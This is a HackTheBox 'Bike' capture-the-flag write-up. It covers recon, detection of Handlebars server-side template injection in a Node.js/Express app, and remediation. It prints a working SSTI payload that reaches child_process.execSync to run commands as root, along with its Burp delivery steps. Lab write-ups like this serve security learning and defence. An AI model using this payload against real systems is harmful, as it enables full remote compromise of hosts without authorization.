# HackTheBox — Bike (Starting Point)

![Difficulty](https://img.shields.io/badge/Difficulty-Very%20Easy-brightgreen)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Skill](https://img.shields.io/badge/Skill-SSTI%20%7C%20RCE-red)

## Overview

**Bike** is a Very Easy Linux machine that centers on a **Server-Side
Template Injection (SSTI)** vulnerability in a Node.js application using the
**Handlebars** templating engine. Exploiting the SSTI leads to **Remote Code
Execution (RCE)** as the `root` user.

| Field | Value |
|-------|-------|
| Platform | HackTheBox — Starting Point |
| OS | Linux |
| Difficulty | Very Easy |
| Key Vulnerability | SSTI (Handlebars) → RCE |
| OWASP Category | A03:2021 – Injection |

---

## 1. Reconnaissance

### Port Scan

An initial `nmap` scan was performed to identify open services:

```bash
nmap -sC -sV <target-ip>
```

**Findings:**

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | SSH | OpenSSH |
| 80/tcp | HTTP | Node.js web application |

### Technology Fingerprinting

The **Wappalyzer** browser extension identified the web stack:

- **Web framework:** Express
- **Runtime:** Node.js

This immediately narrowed the likely attack surface toward JavaScript-based
server-side vulnerabilities.

---

## 2. Identifying the Vulnerability

The application's homepage exposed a single email input field. To probe for
template injection, a classic test payload was submitted:

{{7*7}}

Instead of rendering `49`, the server returned a **parse error** that leaked
critical internal details:

Error: Parse error on line 1
at Parser.parse (/root/Backend/node_modules/handlebars/...)
at ... (/root/Backend/node_modules/express/...)

**Key takeaways from the error:**

- The templating engine is **Handlebars** (confirmed by the module path).
- The framework is **Express**.
- The application root is `/root/Backend/`, implying the service runs as
  **root**.

The parse error confirmed that user input reached the template engine —
a strong indicator of **SSTI**.

---
![Handlebars parse error revealing the template engine](./images/ssti-error-handlebars.png)

## 3. Exploitation (SSTI → RCE)

Because Handlebars does not evaluate arithmetic inside `{{ }}`, a Handlebars-
specific payload is required. The technique used is publicly documented in
resources such as **PayloadsAllTheThings** and **HackTricks**.

### Bypassing "require is not defined"

An initial payload that called `require()` directly failed with:

ReferenceError: require is not defined

`require` is not exposed in the Handlebars template scope. The fix was to
reach it **indirectly** through the globally available `process` object:

```javascript
process.mainModule.require('child_process').execSync('<command>')
```

### Final Payload

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('id').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

> **Credit:** The core Handlebars SSTI technique is adapted from
> PayloadsAllTheThings / HackTricks. The payload was modified to bypass the
> `require is not defined` restriction.

### Delivery

1. The payload was **URL-encoded** (Burp Suite Decoder).
2. It was placed in the `email` parameter of the `POST /` request.
3. The request was sent via **Burp Suite Repeater**.

The `id` / `whoami` command confirmed execution as **root**, after which the
flag was read:

cat /root/flag.txt

---
![URL-encoding the payload in Burp Decoder](./images/payload-url-encoding.png)

![Sending the exploit and receiving RCE output via Repeater](./images/exploitation-repeater.png)

## 4. Impact

The vulnerability grants **full Remote Code Execution as root**, resulting in
complete compromise of the host. An attacker could read sensitive files,
establish persistence, or pivot into the internal network.

---

## 5. Remediation

- **Never pass untrusted user input directly into a template engine.**
- Use a **logic-less** configuration and treat user input strictly as data,
  not as template source.
- Apply strict **input validation** and context-aware output encoding.
- Run the web service under a **low-privilege account**, never as `root`.
- Keep the templating library and dependencies up to date.

---

## Key Lessons Learned

- Verbose error messages can leak the exact technology stack — a valuable
  recon source.
- SSTI shares the same root cause as SQL Injection: **mixing data with code**.
- Understanding *why* a payload fails (e.g., `require is not defined`) and
  adapting it is far more valuable than copy-pasting.

---

*This write-up is for educational purposes. All testing was performed in a
legal, authorized lab environment (HackTheBox).*
